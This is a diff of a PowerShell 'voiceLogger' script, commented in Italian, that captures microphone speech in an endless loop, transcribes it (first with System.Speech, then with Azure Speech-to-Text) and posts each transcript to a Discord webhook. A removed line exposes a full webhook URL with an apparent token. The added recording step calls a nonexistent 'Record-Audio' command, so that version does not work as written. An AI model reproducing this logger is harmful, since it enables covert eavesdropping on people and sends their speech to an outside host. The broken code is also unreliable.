@@ -1,12 +1,13 @@
+# Funzione per caricare il testo su Discord
 function DC-Upload {
     [CmdletBinding()]
     param (
-        [parameter(Position=0, Mandatory=$false)]
+        [parameter(Position=0, Mandatory=$true)]
         [string]$text
     )
 
-    # Webhook Discord
-    $dc = 'https://discord.com/api/webhooks/1370038152143831101/iN2bRBDfDdvTBDEk0ElyeUlObFuw8zmflue_XbZkaTYUL8rH87ZYvwozegioJSkj-um2'
+    # URL del Webhook Discord
+    $dc = 'https://discord.com/api/webhooks/your-webhook-url'
 
     if (-not [string]::IsNullOrWhiteSpace($text)) {
         $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
@@ -26,38 +27,54 @@ function DC-Upload {
     }
 }
 
+# Funzione per il riconoscimento vocale usando Azure Speech-to-Text
 function voiceLogger {
-    Add-Type -AssemblyName System.Speech
-    $recognizer = New-Object System.Speech.Recognition.SpeechRecognitionEngine
-    $grammar = New-Object System.Speech.Recognition.DictationGrammar
-    $recognizer.LoadGrammar($grammar)
-    $recognizer.SetInputToDefaultAudioDevice()
+    param (
+        [string]$subscriptionKey = 'YOUR_AZURE_SPEECH_KEY',   # La tua chiave API Azure
+        [string]$region = 'YOUR_AZURE_REGION'                 # La regione del tuo servizio Azure
+    )
 
-    Write-Host "🎤 VoiceLogger attivo. Pronuncia qualcosa..."
+    # URL per la richiesta del servizio Azure Speech-to-Text
+    $uri = "https://$region.stt.speech.microsoft.com/speech/recognition/conversation/cognitiveservices/v1?language=it-IT"
+
+    # Crea l'header di autenticazione
+    $headers = @{
+        'Ocp-Apim-Subscription-Key' = $subscriptionKey
+        'Content-Type' = 'audio/wav'
+    }
+
+    Write-Host "🎤 VoiceLogger attivo. Pronuncia qualcosa in italiano..."
+
+    # Acquisisce l'audio dal microfono e lo invia a Azure per il riconoscimento vocale
+    $audioDevice = [System.IO.Stream]::Null  # Placeholder per l'input audio
+    $audioFilePath = 'C:\temp\audio.wav'  # File temporaneo per il salvataggio dell'audio
 
     while ($true) {
         try {
-            $result = $recognizer.Recognize()
-            if ($result -and $result.Text.Trim().Length -gt 0) {
-                $text = $result.Text
+            # Registra l'audio (puoi usare software come Audacity per registrare e salvare)
+            Start-Process 'powershell' -ArgumentList "Record-Audio $audioFilePath" -NoNewWindow -Wait
+            
+            # Leggi il file audio e invialo a Azure Speech
+            $audioContent = [System.IO.File]::ReadAllBytes($audioFilePath)
+            $response = Invoke-RestMethod -Uri $uri -Headers $headers -Method Post -Body $audioContent
+
+            if ($response.DisplayText) {
+                $text = $response.DisplayText
                 Write-Host "📝 Testo riconosciuto: $text"
 
-                # Invia a Discord
-                DC-Upload $text
-
-                # Esegui comandi vocali speciali
-                switch -regex ($text.ToLower()) {
-                    '\bnote\b' { Start-Process notepad }
-                    '\bexit\b' { break }
-                }
+                # Invia il testo riconosciuto a Discord
+                DC-Upload -text $text
             }
+
         } catch {
             Write-Host "⚠️ Errore nel riconoscimento vocale: $_"
         }
 
-        Start-Sleep -Milliseconds 500  # Leggero delay per evitare spam del loop
+        Start-Sleep -Seconds 1  # Delay tra i tentativi
     }
 
     Write-Host "🛑 VoiceLogger terminato."
 }
-voiceLogger
+
+# Avvia il logger vocale
+voiceLogger -subscriptionKey 'YOUR_AZURE_SPEECH_KEY' -region 'YOUR_AZURE_REGION'
